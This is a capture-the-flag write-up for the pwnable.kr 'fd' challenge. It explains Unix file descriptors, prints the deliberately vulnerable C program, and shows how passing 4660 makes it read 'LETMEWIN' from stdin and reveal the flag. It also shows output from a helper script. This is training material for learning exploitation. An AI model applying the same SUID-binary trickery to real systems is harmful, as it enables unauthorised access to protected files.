# file-descriptor-stdin-attack
In Unix and related computer operating systems, a file descriptor (FD, less frequently fildes) is an abstract indicator (handle) used to access a file or other input/output resource, such as a pipe or network socket. File descriptors form part of the POSIX application programming interface. A file descriptor is a non-negative integer, generally represented in the C programming language as the type int (negative values being reserved to indicate "no value" or an error condition).  Each Unix process (except perhaps a daemon) should expect to have three standard POSIX file descriptors, corresponding to the three standard streams.

# Example of use this Script in wargame pwnable.kr (fd)
```
root@kali:~/Desktop/Scripts# python3 file-descriptor.py --hexvalue 0x1234 --vulnapp fd
[+]Hexvalue: 0x1234
[+]Vulnapp: fd
LETMEWIN
good job :)
mommy! I think I know what a file descriptor is!!
```

# Example in wargame pwnable.kr (fd)

ssh fd@pwnable.kr -p2222 (pw:guest)


We are into the server and we see 3 files: fd  fd.c  flag. It is very importat thing to know who am i, so I just enter id or whoami, and seeing the actual user. The file fd.c is readable by the user fd. -rw-r--r-- 1 root   root  418 Jun 11  2014 fd.c
And the binary has SUID bit and I can run it. -r-sr-x--- 1 fd_pwn fd   7322 Jun 11  2014 fd
Flag file we can't read the solution....So we could trick the fd application to read flag and view the content of the file.

Running the binary file to find out some issue or clue :S. When we open this file, I just discover than I will introduce some kind of argument like a number: 
fd@ubuntu:~$ ./fd
pass argv[1] a number

View of the vulnerable C code:
```c
fd@ubuntu:~$ cat fd.c 
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
char buf[32];
int main(int argc, char* argv[], char* envp[]){
    if(argc<2){ // Do not accept less than 2 arguments (program name is one of them), print help and exit
        printf("pass argv[1] a number\n");
        return 0;
    } 

// atoi: convert a string array to integer
    int fd = atoi( argv[1] ) - 0x1234;
    int len = 0;

// Read from file descriptor int(argv[1] - 0x1234)
    len = read(fd, buf, 32);

// If strcmp("LETMEWIN\n", buf) returns 0 (matches), print flag
    if(!strcmp("LETMEWIN\n", buf)){
        printf("good job :)\n");
        system("/bin/cat flag");
        exit(0);
    }
    printf("learn about Linux file IO\n");
    return 0;

}

```
The atoi function convert a string to integer value. It is interesting to know what is Linux File Descriptor. The 0 value is stdin, so I figure out how is the value in decimal to 0x1234 = 4660. If I pass as argument 4660, that is equal to read(0, buf, 32). Therefore we need to know that stdin must be enabled with 0 File Descriptor, and you can convert to zero through argument passed. So if I put 4660, fd == 0 and this let us to write (stdin) LETMEWIN\n and saved in buffer array.
```
fd@ubuntu:~$ ./fd 4660
LETMEWIN
good job :)
mommy! I think I know what a file descriptor is!!
```

More information about Linux File Descriptors: https://en.wikipedia.org/wiki/File_descriptor
